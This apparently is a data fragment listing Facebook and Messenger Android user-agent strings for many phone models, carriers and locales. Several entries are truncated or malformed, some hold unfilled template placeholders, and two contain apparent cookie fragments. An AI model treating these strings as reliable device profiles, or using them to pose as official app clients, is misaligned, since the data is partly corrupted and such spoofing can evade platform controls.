    'Dalvik\\/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI\\/V11.0.11.0.PCXEUXM) [FBAN\\/Orca-Android;FBAV\\/288.0.0.15.118;FBPN\\/com.facebook.orca;FBLC\\/pl_PL;FBBV\\/253310653;FBCR\\/PLAY (T-Mobile);FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 8T;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2130};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.1; CPH1727 Build\\/N6F26Q) [FBAN\\/Orca-Android;FBAV\\/288.0.0.15.118;FBPN\\/com.facebook.orca;FBLC\\/th_TH;FBBV\\/253310646;FBCR\\/AIS;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/CPH1727;FBSV\\/7.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.7,width=1080,height=2016};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; oppo r7sm Build\\/LYZ28N) [FBAN\\/EMA;UNITY_PACKAGE\\/1590;FBBV\\/0;FBAV\\/26.0.0.4.133;FBDV\\/oppo r7sm;FBLC\\/en_US;FBOP\\/20]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-S111DL Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/291.2.0.22.114;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/257752740;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-S111DL;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1431};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; SM-J410G Build\\/M1AJB) [FBAN\\/Orca-Android;FBAV\\/291.2.0.22.114;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/257752740;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-J410G;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1384};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build\\/HUAWEIDUB-LX1) [FBAN\\/Orca-Android;FBAV\\/291.2.0.22.114;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/257752740;FBCR\\/VIVACOM;FBMF',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build\\/HUAWEIDUB-LX1) [FBAN\\/Orca-Android;FBAV\\/291.2.0.22.114;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/257752740;FBCR\\/VIVACOM;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/DUB-LX1;FBSV\\/8.1.0;FBCA',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build\\/LMY47V) [FBAN\\/Orca-Android;FBAV\\/251.0.0.12.117;FBPN\\/com.facebook.orca;FBLC\\/ru_RU;FBBV\\/197803937;FBCR\\/lifecell;FBMF\\/LENOVO;FBBD\\/Lenovo;FBDV\\/Lenovo A6020a46;FBSV\\/5.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;] FBBK\\/',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; FIG-LX1 Build\\/HUAWEIFIG-L31) [FBAN\\/Orca-Android;FBAV\\/302.0.0.11.117;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/275958904;FBCR\\/Yoigo;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/FIG-LX1;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2032};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; Kirin Treble Build\\/PQ2A.190405.003) [FBAN\\/FB4A;FBAV\\/306.1.0.40.119;FBPN\\/com.facebook.katana;FBLC\\/ru_US;FBBV\\/273922298;FBCR\\/life:) BY;FBMF\\/HUAWEI;FBBD\\/Huawei;FBDV\\/Kirin Treble;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.4,width=1080,height=2075};FB_FW\\/1;FBRV\\/275142282;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; SM-G973F Build\\/RP1A.200720.012) [FBAN\\/Orca-Android;FBAV\\/299.0.0.11.115;FBPN\\/com.facebook.orca;FBLC\\/de_DE;FBBV\\/272301973;FBCR\\/vodafone.de;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G973F;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2042};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; SM-G925F Build\\/NRD90M) [FBAN\\/Orca-Android;FBAV\\/304.2.0.17.118;FBPN\\/com.facebook.orca;FBLC\\/ar_AE;FBBV\\/279457446;FBCR\\/Vodafone;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G925F;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=4.0,width=1440,height=2560};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; SM-G955F Build\\/NRD90M) Source\\/1 [FBAN\\/EMA;UNITY_PACKAGE\\/749;FBBV\\/154200404;FBAV\\/146.0.0.9.102;FBDV\\/SM-G955F;FBLC\\/vi_VN;FBOP\\/20]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build\\/HUAWEILUA-L21) [FBAN\\/MessengerLite;FBAV\\/133.0.0.1.116;FBPN\\/com.facebook.mlite;FBLC\\/cs_CZ;FBBV\\/279951921;FBCR\\/O2-CZ;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/HUAWEI LUA-L21;FBSV\\/5.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.5,width=480,height=854};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build\\/HUAWEIATU-L31) [FBAN\\/MessengerLite;FBAV\\/126.0.0.1.117;FBPN\\/com.facebook.mlite;FBLC\\/cs_CZ;FBBV\\/271069048;FBCR\\/O2-CZ;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/ATU-L31;FBSV\\/8.0.0;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1358};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build\\/HUAWEIATU-L31) [FBAN\\/MessengerLite;FBAV\\/126.0.0.1.117;FBPN\\/com.facebook.mlite;FBLC\\/cs_CZ;FBBV\\/271069048;FBCR\\/O2-CZ;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/ATU-L31;FBSV\\/8.0.0;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1358};] Soubor cookie SryV********************',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\\/KOT5506) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z00AD;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\\/KOT5506) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z016D;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 6.0; Build\\/MXB48T) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z016D;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build\\/LMY47V) [FBAN\\/FB4A;FBAV\\/43.0.0.29.147;FBPN\\/com.facebook.katana;FBLC\\/en_GB;FBBV\\/14274161;FBCR\\/Tele2 LT;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-J320F;FBSV\\/5.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build\\/JLS36C) [FBAN\\/FB4A;FBAV\\/251.0.0.31.111;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/188827991;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G3518;FBSV\\/4.4.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=720,height=1244};FB_FW\\/1;FBRV\\/190301973;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 5; SM-G3518 Build\\/JLS36C) [FBAN\\/FB4A;FBAV\\/251.0.0.31.111;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/188827991;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G3518;FBSV\\/4.4.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=720,height=1244};FB_FW\\/1;FBRV\\/190301973;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A505FM Build\\/PPR1.180610.011) [FBAN\\/FB4A;FBAV\\/327.0.0.33.120;FBPN\\/com.facebook.katana;FBLC\\/ru_RU;FBBV\\/304400854;FBCR\\/MegaFon;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505FM;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2131};FB_FW\\/1;FBRV\\/305275776;] FBBK\\/1CookieqstJ',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; SM-G930V Build\\/NRD90M) [FBAN\\/Orca-Android;FBAV\\/155.0.0.14.93;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/94098382;FBCR\\/Verizon Wireless;FBMF\\/samsung;FBBD\\/Verizon;FBDV\\/SM-G930V;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1280};FB_FW\\/1;',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; SM-G930V Build\\/NRD90M) [FBAN\\/Orca-Android;FBAV\\/174.0.0.24.82;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/116802184;FBCR\\/Verizon Wireless;FBMF\\/samsung;FBBD\\/Verizon;FBDV\\/SM-G930V;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; moto g(20) Build\\/RTAS31.68-20-2) [FBAN\\/Orca-Android;FBAV\\/336.0.0.13.142;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/327992372;FBCR\\/TELCEL;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g(20);FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1466};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; SM-G986U Build\\/RP1A.200720.012) [FBAN\\/Orca-Android;FBAV\\/316.4.0.15.120;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/297403762;FBCR\\/Verizon ;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G986U;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2201};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-A102U Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/342.1.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/339015010;FBCR\\/TELCEL;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A102U;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1402};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; COL-L29 Build\\/HUAWEICOL-L29) [FBAN\\/Orca-Android;FBAV\\/314.1.0.19.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/293875204;FBCR\\/null;FBMF\\/HUAWEI;FBBD\\/HONOR;FBDV\\/COL-L29;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build\\/R16NW) [FBAN\\/FB4A;FBAV\\/{7};FBPN\\/com.facebook.katana;FBLC\\/{0}_{1};FBBV\\/261476344;FBCR\\/{2};FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A720F;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/&#123;&#123;density=2.625,width=1080,height=1920&#125;&#125;;FB_FW\\/1;FBRV\\/263054303;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; moto e Build\\/QPGS30.82-135-16) [FBAN\\/Orca-Android;FBAV\\/342.1.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/339015010;FBCR\\/Verizon ;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1422};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; SM-A326U Build\\/RP1A.200720.012) [FBAN\\/FB4A;FBAV\\/348.0.0.39.118;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/338919009;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A326U;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.875,width=720,height=1465};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 6.0.1; SM-G532M Build\\/MMB29T) [FBAN\\/Orca-Android;FBAV\\/343.0.0.8.474;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/344064182;FBCR\\/Movistar;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G532M;FBSV\\/6.0.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.5,width=540,height=960};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Quest 2 Build\\/QQ3A.200805.001) [FBAN\\/OculusHorizon;FBAV\\/35.0.0.117.300;FBDV\\/Quest 2;FBCR\\/null;FBLC\\/en_US;FBSV\\/10;FBBD\\/oculus;FBBV\\/333880879;FBCA\\/arm64-v8a:;FBMF\\/Oculus;FBPN\\/com.oculus.horizon;FBVM\\/{&quot;912539389206240&quot;:&quot;35.0.0.145.300&quot;,&quot;1481000308606657&quot;:&quot;35.0.0.140.341&quot;,&quot;1916519981771802&quot;:&quot;18.1.0.2.46.337441587&quot;,&quot;1689311011174858&quot;:&quot;35.0.0.140.341&quot;,&quot;2141310506170802&quot;:&quot;3',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A107M Build\\/PPR1.180610.011) [FBAN\\/FB4A;FBAV\\/266.0.0.64.124;FBPN\\/com.facebook.katana;FBLC\\/es_US;FBBV\\/209629359;FBCR\\/TELCEL;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A107M;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1439};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; LM-X420 Build\\/PKQ1.190302.001) [FBAN\\/Orca-Android;FBAV\\/346.0.0.7.117;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/348143439;FBCR\\/HOME;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LM-X420;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1356};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; LGL355DL Build\\/QKQ1.200108.002) [FBAN\\/Orca-Android;FBAV\\/349.0.0.7.108;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/352408711;FBCR\\/null;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LGL355DL;FBSV\\/10;',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build\\/OPPS27.91-179-8-16) [FBAN\\/Orca Android;FBAV\\/342.1.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/344064014;FBCR\\/Movistar;FBMF\\/m otorola;FBBD\\/motorola;FBDV\\/moto e5 plus;FBSV\\/8.0.0;FBCA\\/armeabi v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1344);FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; Acer Chromebook 14 (CB3-431) Source\\/1 [FBAN\\/EMA;UNITY_PACKAGE\\/342;FBBV\\/107586706;FBAV\\/172.0.0.8.182;FBDV\\/SM-J210F;FBLC\\/en_US;FBOP\\/20] Build\\/R99-14469.41.0) Source\\/1 [FBAN\\/EMA;UNITY_PACKAGE\\/342;FBBV\\/107586706;FBAV\\/172.0.0.8.182;FBDV\\/SM-J210F;FBLC\\/en_US;FBOP\\/20]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; moto g power (2021) Build\\/RZBS31.Q2-143-27-7) [FBAN\\/Orca-Android;FBAV\\/353.0.0.12.116;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/358361194;FBCR\\/cricket;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g power (2021);FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1488};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; moto g power (2021) Build\\/RZBS31.Q2-143-27-7) [FBAN\\/Orca-Android;FBAV\\/352.0.0.9.116;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/356687955;FBCR\\/cricket;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g power (2021);FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1488};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Lenovo TB-X505F Build\\/QKQ1.191224.003) [FBAN\\/Orca-Android;FBAV\\/352.0.0.9.116;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/356687941;FBCR\\/null;FBMF\\/LENOVO;FBBD\\/Lenovo;FBDV\\/Lenovo TB-X505F;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.0,width=1280,height=784};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; RMX2155 Build\\/RP1A.200720.011) [FBAN\\/MessengerLite;FBAV\\/287.0.0.3.117;FBPN\\/com.facebook.mlite;FBLC\\/cs_CZ;FBBV\\/345379814;FBCR\\/SAZKAmobilCZ;FBMF\\/realme;FBBD\\/realme;FBDV\\/RMX2155;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.55,width=1080,height=2173};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; ASUS_I005DC Build\\/RKQ1.210303.002) [FBAN\\/FB4A;FBAV\\/336.0.0.20.117;FBPN\\/com.facebook.katana;FBLC\\/zh_TW_#Hant;FBBV\\/317766059;FBCR\\/&amp;#21488-&amp;#28771-&amp;#22823-&amp;#21733-&amp;#22823-;FBMF\\/asus;FBBD\\/asus;FBDV\\/ASUS_I005DC;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2322};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-A115M Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/319.0.0.22.170;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/301916794;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A115M;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1411};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-T290 Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/364.0.0.10.112;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/374667243;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-T290;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.3312501,width=1280,height=736};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; S45B Build\\/OPM2.171019.012) [FBAN\\/EMA;FBBV\\/0;FBAV\\/26.0.0.4.133;FBDV\\/S45B;FBLC\\/id_ID;FBNG\\/UNKNOWN;FBMNT\\/UNKNOWN;FBDM\\/{density=1.5}]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\\/KOT5506) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z007;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\\/KOT5506) [FBAN\\/FB4A;FBAV\\/106.0.0.26.68;FBBV\\/45904160;FBDM\\/{density=3.0,width=1080,height=1920};FBLC\\/it_IT;FBRV\\/45904160;FBCR\\/PosteMobile;FBMF\\/asus;FBBD\\/asus;FBPN\\/com.facebook.katana;FBDV\\/ASUS_Z007;FBSV\\/5.0;FBOP\\/1;FBCA\\/x86:armeabi-v7a;],gzip(gfe)',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; 5003D_EEA Build\\/OPM2.171019.012) [FBAN\\/Orca-Android;FBAV\\/294.0.0.24.129;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/263695251;FBCR\\/O2 - UK;FBMF\\/TCL;FBBD\\/TCL;FBDV\\/5003D_EEA;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.5,width=480,height=888};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-G990U Build\\/SP1A.210812.016) [FBAN\\/FB4A;FBAV\\/375.1.0.28.111;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/382948769;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G990U;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2097};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; 220333QAG Build\\/RKQ1.211001.001) [FBAN\\/Orca-Android;FBAV\\/378.0.0.25.106;FBPN\\/com.facebook.orca;FBLC\\/es_US;FBBV\\/397777638;FBCR\\/TELCEL;FBMF\\/Xiaomi;FBBD\\/Redmi;FBDV\\/220333QAG;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1505};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 2.3.0; vivo 1935 Build\\/QP1A.190711.020) [FBAN\\/MessengerLite;FBAV\\/312.0.0.8.106;FBPN\\/com.facebook.mlite;FBLC\\/in_ID;FBBV\\/431836095;FBCR\\/AXIS;FBMF\\/vivo;FBBD\\/vivo;FBDV\\/vivo 1935;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.29375,width=1080,height=2145};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build\\/N2G48H) [FBAN\\/FB4A;FBAV\\/382.0.0.33.111;FBPN\\/com.facebook.katana;FBLC\\/ru_RU;FBBV\\/394408512;FBCR\\/Astelit-LIFE;FBMF\\/Asus;FBBD\\/Asus;FBDV\\/ASUS_Z01QD;FBSV\\/7.1.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=720,height=1280};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; NAM-LX9 Build\\/HUAWEINAM-L29) [FBAN\\/Orca-Android;FBAV\\/370.0.0.14.108',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; VOG-L29 Build\\/HUAWEIVOG-L29) [FBAN\\/FB4A;FBAV\\/287.0.0.50.119;FBPN\\/com.facebook.katana;FBLC\\/tr_TR;FBBV\\/243660825;FBCR\\/Vodafone;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/VOG-L29;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2265};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI\\/V11.0.1.0.QFGEUXM) [FBAN\\/FB4A;FBAV\\/396.1.0.28.104;FBPN\\/com.facebook.katana;FBLC\\/tr_TR;FBBV\\/319214973;FBCR\\/Vodafone;FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 7;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2131};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; LM-Q610.FG Build\\/011019) [FBAN\\/FB4A;FBAV\\/225.0.0.47.118;FBPN\\/com.facebook.katana;FBLC\\/pl_PL;FBBV\\/158425924;FBCR\\/PLAY;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LM-Q610.FG;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.625,width=1080,height=2034};FB_FW\\/1;FBRV\\/159951317;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; RMX3151 Build\\/RP1A.200720.011) [FBAN\\/Orca-Android;FBAV\\/391.2.0.20.404;FBPN\\/com.facebook.orca;FBLC\\/cs_CZ;FBBV\\/437533953;FBCR\\/Vodafone',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.1; SM-J250F Build\\/NMF26X) [FBAN\\/Orca-Android;FBAV\\/66.0.3774.127;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/854283466;FBCR\\/XL Axiata;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-J250F;FBSV\\/7.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.25,height=1024,width=2048};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5; Moto Build\\/QP1A.244982.977) [FBAN\\/Orca-Android;FBAV\\/288.0.0.15.118;FBPN\\/com.facebook.orca;FBLC\\/pl_PL;FBBV\\/253310653;FBCR\\/PLAY (T-Mobile);FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 8T;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2130};FB_FW\\/1;FBBK\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; M2006C3MNG MIUI\\/V12.0.14.0.QCSEUXM) [FBAN\\/Orca-Android;FBAV\\/396.0.0.14.82;FBPN\\/com.facebook.orca;FBLC\\/cs_CZ;FBBV\\/446475560;FBCR\\/O2.CZ;FBMF\\/Xiaomi;FBBD\\/Redmi;FBDV\\/M2006C3MNG;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1449};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; 2201117SY Build\\/RP1A.200720.011) [FBAN\\/Orca-Android;FBAV\\/393.0.0.18.92;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/440593596;FBCR\\/Digi.Mobil;FBMF\\/Xiaomi;FBBD\\/Redmi;FBDV\\/2201117SY;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2177};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; moto e(7i) power Build\\/QOJS30.506-7-18) [FBAN\\/FB4A;FBAV\\/407.0.0.30.97;FBPN\\/com.facebook.katana;FBLC\\/es_US;FBBV\\/458543253;FBCR\\/UNEFON 4G;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e(7i) power;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1472};FB_FW\\/1;FBRV\\/0;]',
